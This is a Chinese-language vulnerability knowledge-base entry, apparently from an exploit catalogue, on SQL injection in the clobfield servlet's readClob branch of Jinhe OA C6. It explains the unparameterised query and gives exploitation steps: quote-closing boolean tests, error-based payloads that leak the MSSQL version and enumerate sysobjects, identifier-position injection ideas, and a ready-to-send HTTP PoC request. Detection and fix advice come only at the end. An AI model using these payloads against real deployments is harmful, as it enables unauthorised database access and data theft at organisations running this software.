---
id: web-generic-sqli-jhsoft-clobfield-readclob-concat
title: 金和 OA C6 /servlet/clobfield 的 readClob 分支四参数拼接 SQL：sKeyvalue 报错注入泄露 MSSQL 版本
type: scenario
domain: web
path: web/generic/sqli
technique: jhsoft-clobfield-readclob-statement-concat
aliases:
- 金和OA clobfield SQL注入
- cn.com.fcsoft.servlet.clobfield
- readClob 注入
- sKeyvalue 报错注入
- 金和 OA CLOB 读取注入
tags:
- sqli
- mssql
- error-based
- jhsoft
- oa
- servlet
- concatenation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V528
  verified_at: '2026-11-11T15:09:45+08:00'
  notes: 已对照原文与img14-20核对：类名cn.com.fcsoft.servlet.clobfield、四参数Statement拼接、img20报错响应含Microsoft SQL Server 2008 R2 10.50.4000.0均一致。未验证点：未实机复现。dedup候选为同产品其他注入端点，非重复。原文未给版本号，未设affected_versions。
---

## 一句话结论

金和 OA C6 的 `/jc6/servlet/clobfield` 在 `key=readClob` 时把 `sImgname`、`sTablename`、`sKeyname`、`sKeyvalue` 四个请求参数直接拼进 `select <sImgname> from <sTablename> where <sKeyname>='<sKeyvalue>'`，用 `Statement.execute` 执行且无过滤；把 `sKeyvalue` 闭合后用 `convert(int,@@version)` 报错注入即可泄露数据库版本（菜单选择框 SQL 注入）。

## 原理

- **入口**：`cn.com.fcsoft.servlet.clobfield` 继承 `HttpServlet`，`web.xml` 映射 `/servlet/clobfield`（应用上下文 `/jc6`）。
- **参数到实例**：`service()` 依次取 `sTablename`、`sImgname`、`sKeyname`、`sKeyvalue`、`key`，new 一个 `clobfield1` 实例并把前四个参数赋给同名字段；`clobfield1` 构造函数从 Spring 上下文取 `jdbcTemplate`（`JdbcTemplate` bean，注入 `dataSource`）。
- **分支**：`key.equals("readClob")` 时调用 `wd.readClob()` 并把返回内容写到响应；`key.equals("writeClob")` 时读取请求体写入 CLOB（另一条写路径，原文未展开）。
- **注入点**：`readClob()` 中`conn = jt.getDataSource().getConnection(); stat = conn.createStatement(); stat.execute("select " + this.sImgname + " from " + this.sTablename + " where " + this.sKeyname + "='" + this.sKeyvalue + "'");`。四个变量全部来自请求：`sImgname`/`sTablename`/`sKeyname` 位于标识符位置（未加引号，可直接注入子查询/函数），`sKeyvalue` 位于单引号字符串内（需闭合单引号）。
- **为什么报错注入可行**：执行用 `Statement` 而非 `PreparedStatement`，SQL 文本由用户输入拼接；`sKeyvalue=1' and 1=convert(int,@@version)--+` 闭合后把 `@@version` 强转 int 触发类型转换错误，JDBC 异常信息原样返回页面，泄露数据库版本（原文响应中出现 `Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0`）。
- **为何不是注入假象**：`JdbcTemplate` 在此只用于拿 DataSource，真正执行是原生 `Statement.execute`，没有预编译占位符；任何参数都没有经过校验。

## 触发条件

- 目标为金和 OA C6（`/jc6` 上下文），`/servlet/clobfield` 可访问。
- 数据库为 MSSQL（原文环境为 SQL Server 2008 R2；语法依赖 `convert`/`@@version`，其他库需换对应表达式）。
- 原文请求携带 `JSESSIONID` Cookie，接口可能要求登录态，实际按目标确认。
- `readClob` 分支可用（`key=readClob`）。

## 利用步骤

1. 以正常参数请求基线：`key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1`，确认返回附件内容。
2. 用 `sKeyvalue=1' and 1=1--+` 与 `1' and 1=2--+` 对比响应差异，确认单引号闭合与注入存在。
3. 报错注入：`sKeyvalue=1' and 1=convert(int,@@version)--+`，读取响应中的 SQL Server 版本信息。
4. 进一步用 `convert(int,(select top 1 name from sysobjects))` 逐段泄露表名/列名/数据，或改用 union/盲注按回显条件选择。
5. 也可尝试从标识符位置注入：`sImgname=(select ...)`、`sTablename=(select ...) t` 等，视 SQL 语法与错误回显而定。

## PoC

```http
POST /jc6/servlet/clobfield HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<valid-session>

key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1' and 1 = convert(int,@@version) --+
```

响应体（原文截图）中泄露：

```text
将 nvarchar 值 'Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) ...' 转换成数据类型 int 时失败。
```

即 `@@version` 被报错带出，SQL 注入成立。

## 变体与关联

- 变体一：`sImgname`/`sTablename`/`sKeyname` 未加引号，属标识符注入面，可尝试 `(select ...)`、子查询别名、`UNION` 构造（原文只演示 `sKeyvalue`）。
- 变体二：`key=writeClob` 分支把请求体写入数据库 CLOB，可作为写入原语（需进一步确认写入目标表字段是否可控）。
- 关联：[[web-generic-sqli-jhsoft-getattout-keyid-union]]（同文章另一注入点，`prepareStatement` 无占位符仍可注入）、[[web-generic-file-upload-jhsoft-saveasotherformatservlet-filename-webshell]]（同文章任意文件上传）、[[web-generic-sqli-jhsoft-incentiveplan-fulfill-incentiveid-version]]（同产品 MSSQL 注入）。
- 边界：非 MSSQL 时 `convert(int,@@version)` 不适用；若接口前置鉴权且无有效会话，需先获得登录态。

## 检测与防御

- 检测：`/servlet/clobfield` 请求参数出现单引号、`--`、`convert(`、`@@version`、`sysobjects`、`WAITFOR` 等特征；响应出现数据库错误信息；`sKeyvalue` 等参数出现非常规长度/语法。
- 修复：四个参数全部改为 `PreparedStatement` 占位符（表名/列名无法参数化时用严格白名单映射），不再拼接 SQL；`Statement.execute` 改为预编译。
- 加固：错误信息统一脱敏，禁止把 JDBC 异常原文回显；接口加认证与最小权限数据库账号；WAF 拦截特征串。
